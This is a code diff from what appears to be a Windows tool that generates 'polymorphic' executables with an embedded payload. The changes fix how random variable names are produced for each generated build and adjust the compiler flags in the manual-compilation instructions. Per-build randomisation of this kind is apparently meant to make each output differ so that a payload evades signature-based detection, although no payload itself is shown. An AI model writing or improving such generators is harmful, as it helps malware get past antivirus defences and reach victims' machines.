@@ -205,17 +205,23 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
         }
     }
     
-    // Generate unique random variables
+    // Generate unique random variables - ensure valid C identifiers
     char randVar1[20] = {0}, randVar2[20] = {0}, randVar3[20] = {0}, randVar4[20] = {0}, randVar5[20] = {0}, randVar6[20] = {0};
     srand((unsigned int)(time(NULL) ^ (DWORD)GetTickCount64() ^ GetCurrentProcessId()));
     
-    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    const int charsetSize = sizeof(charset) - 1;
+    const char letters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    const char alphanumeric[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    const int lettersSize = sizeof(letters) - 1;
+    const int alphanumericSize = sizeof(alphanumeric) - 1;
+    
     for (int i = 0; i < 6; i++) {
         char* var = (i == 0) ? randVar1 : (i == 1) ? randVar2 : (i == 2) ? randVar3 : 
                    (i == 3) ? randVar4 : (i == 4) ? randVar5 : randVar6;
-        for (int j = 0; j < 15; j++) {
-            var[j] = charset[rand() % charsetSize];
+        // First character must be a letter
+        var[0] = letters[rand() % lettersSize];
+        // Remaining characters can be alphanumeric
+        for (int j = 1; j < 15; j++) {
+            var[j] = alphanumeric[rand() % alphanumericSize];
         }
         var[15] = '\0';
     }
@@ -1199,7 +1205,7 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
                 "To compile manually:\n"
                 "1. Open 'Developer Command Prompt for VS 2022' from Start Menu\n"
                 "2. Navigate to the source file location\n"
-                "3. Run: cl /O1 /MT /TC source.cpp /Fe:output.exe /link user32.lib kernel32.lib\n\n"
+                "3. Run: cl /O2 /MD /TC source.cpp /Fe:output.exe /link user32.lib kernel32.lib\n\n"
                 "OR use Visual Studio 2022 IDE:\n"
                 "1. Create new Empty Project\n"
                 "2. Add your .cpp file to the project\n"
@@ -1223,7 +1229,7 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
                 "Auto-compilation failed, but VS2022-optimized source code has been saved.\n\n"
                 "Manual VS2022 compilation:\n"
                 "1. Open VS2022 Developer Command Prompt\n"
-                "2. Run: cl /O1 /MT /TC source.cpp /Fe:output.exe /link user32.lib kernel32.lib\n"
+                "2. Run: cl /O2 /MD /TC source.cpp /Fe:output.exe /link user32.lib kernel32.lib\n"
                 "3. Or open source in VS2022 IDE and build with Release configuration\n\n"
                 "The source includes enterprise-grade polymorphic features.",
                 "VS2022 Source Generated", MB_OK | MB_ICONINFORMATION);
